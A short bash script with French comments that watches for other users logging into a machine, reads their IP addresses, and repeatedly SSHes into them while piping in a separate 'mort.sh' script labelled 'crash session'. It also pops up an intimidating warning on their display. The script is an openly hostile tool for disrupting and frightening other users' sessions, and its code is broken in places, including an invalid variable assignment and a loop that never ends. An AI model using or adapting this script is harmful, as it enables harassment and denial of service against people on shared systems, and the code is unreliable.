#!/bin/bash
while true;
do
    nbCO=$(who | grep -v allain | wc -l) # nombre de personne connectées
    echo "Il y a "$nbCO "connectés"

    if [ $nbCO -ge 1 ];
    then
    nom=$(who | grep -v allain | cut -d' ' -f1)
    echo $nom
    notify-send $nom

    for ((i=1 ; $nbCO ; i++)) # bloucle for pour chaque connecté ?
    do
        ip$i=$(who | grep -v allain | rev | cut -d'(' -f1 | rev | cut -d')' -f1)
        echo $ip

    done
            echo $ip
            while seq 1000; do ssh $ip ; done < ./mort.sh # crash session
            ssh $ip 'DISPLAY=:0 zenity --error --text="Je serai toi je ne resterai pas là" --title="Attention \!" --width=300' # message
            sleep 3
            # if [ $nbCO -ge 1 ];
            # then
            #     while seq 1000; do ssh $ip ; done < ./mort.sh # crash session
            # fi
        # done
    fi
    sleep 3
done
